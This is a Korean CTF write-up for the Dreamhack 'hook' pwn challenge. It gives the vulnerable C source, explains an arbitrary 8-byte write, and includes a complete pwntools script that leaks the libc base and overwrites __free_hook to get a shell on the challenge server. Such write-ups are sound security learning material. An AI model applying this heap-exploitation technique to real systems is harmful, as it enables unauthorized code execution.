hook 라이트업
===========

## 보호 기법 확인

<img width="1013" height="182" alt="image" src="https://github.com/user-attachments/assets/633d44b2-1b00-48f1-9bc0-19d48b9f2712" />


## 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```


* **취약점의 핵심:** `main` 함수에서 `*(long *)*ptr = *(ptr+1);` 코드가 실행된다.
    * `ptr`은 `malloc(size)`로 할당받은 힙 메모리 주소를 가리킨다.
    * 코드는 `ptr`이 가리키는 값(즉, `ptr[0]`)을 주소로 보고
      그 주소에 `ptr`의 다음 값(즉, `ptr[1]`)을 8바이트(long) 크기로 덮어쓰는 기능을 한다.
    * 공격자가 `ptr`에 원하는 값을 입력하여 임의의 메모리 주소를 조작(덮어쓰기)할 수 있게 하는 취약점이다.

* **공격 목표: `__free_hook` 변조**
    * `main` 함수 마지막에는 `free(ptr);`이 두 번 호출되고 그 뒤에 `system("/bin/sh");`가 실행된다.
    * `free(ptr)`을 두 번 호출하는 것은 에로룰 발생시킨다. 
    * 이 문제를 해결하기 위해 `free` 함수가 호출될 때 `system("/bin/sh")`와 같은 쉘을 실행하도록 만들고자 한다.
    * 이를 위해 `free` 함수가 사용하는 **`__free_hook`** 변수를 조작하는 방법을 사용한다.
    * 위에서 분석한 `*(long *)*ptr = *(ptr+1);` 취약점을 이용하여 `__free_hook`의 주소에 `system` 함수의
      주소를 덮어쓸 것이다.


### 익스플로잇

<img width="891" height="117" alt="image" src="https://github.com/user-attachments/assets/645bb38c-3785-4122-8f7f-7e836b19fd87" />

ida에서 열어서 "/bin/sh" 주소 먼저 알아내고

### 익스플로잇 코드

```python
from pwn import*
p = remote("host8.dreamhack.games", 20252)
context.log_level = "debug"
e = ELF("./hook")
libc = ELF("./libc-2.23.so")
 
#one_gadget = [0xf1147, 0x45216, 0x4526a, 0xf02a4]
main_system = 0x0400A11
 
p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
 
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
#magic = libc_base + one_gadget[2]
 
payload = p64(free_hook) + p64(main_system)
 
p.sendlineafter("Size: ", "400")
 
 
p.sendlineafter("Data: ", payload)
 
p.interactive()
```




<img width="957" height="157" alt="image" src="https://github.com/user-attachments/assets/3adb7c14-927e-4c33-9a5a-08136188c528" />
